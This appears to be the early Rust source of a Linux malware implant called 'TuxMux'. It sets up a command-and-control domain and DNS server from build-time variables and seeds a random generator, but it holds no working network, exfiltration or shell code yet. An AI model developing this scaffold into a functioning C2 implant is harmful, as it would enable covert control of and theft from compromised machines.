#![no_std]
#![no_main]

#[cfg(debug_assertions)]
mod debug;

#[cfg(debug_assertions)]
pub use debug::print;

// use talc::{*, source::Claim};

struct Lcg {
    seed: u32,
    multiplier: u32, // a
    increment: u32, // c
}

impl Lcg {
    fn new(seed: u32, multiplier: u32, increment: u32) -> Self {
        Self { seed, multiplier, increment }
    }
    fn next_u16(&mut self) -> u16 {
        self.seed = self.seed.wrapping_mul(self.multiplier).wrapping_add(self.increment);
        (self.seed >> 16) as u16
    }
}
    
// #[global_allocator]
// static TALC: TalcLock<spinning_top::RawSpinlock, Claim> = TalcLock::new(unsafe {
//     static mut INITIAL_HEAP: [u8; min_first_heap_size::<DefaultBinning>() + 2000] =
//         [0; min_first_heap_size::<DefaultBinning>() + 2000];
//     Claim::array(&raw mut INITIAL_HEAP)
// });

#[unsafe(no_mangle)]
extern "C" fn main() -> i32 {
    #[cfg(debug_assertions)]
    {
        println!("TuxMux implant debug; DO NOT USE IN PRODUCTION");
        println!("C2 Domain: {:?}, DNS server: {}.{}.{}.{}", C2_DOMAIN, DNS_SERVER[0], DNS_SERVER[1], DNS_SERVER[2], DNS_SERVER[3]);
    }

    let mut seed: u32 = 0;
    unsafe { core::arch::x86_64::_rdrand32_step(&mut seed) };
    let mut lcg = Lcg::new(seed, 1664525, 1013904223); // https://en.wikipedia.org/wiki/Linear_congruential_generator
    
    #[cfg(debug_assertions)]
    { 
        let random = lcg.next_u16();
        println!("Random number: {}", random);
    }
    0
}

const fn parse_u8(s: &str) -> u8 {
    let b = s.as_bytes();
    let mut i = 0;
    let mut n: u16 = 0;
    while i < b.len() {
        n = n * 10 + (b[i] - b'0') as u16;
        i += 1;
    }
    n as u8
}

macro_rules! env_u8 {
    ($name:expr) => { parse_u8(env!($name)) };
}

const C2_DOMAIN: &str = env!("C2_DOMAIN");
const DNS_SERVER: [u8; 4] = [env_u8!("DNS_1"), env_u8!("DNS_2"), env_u8!("DNS_3"), env_u8!("DNS_4")];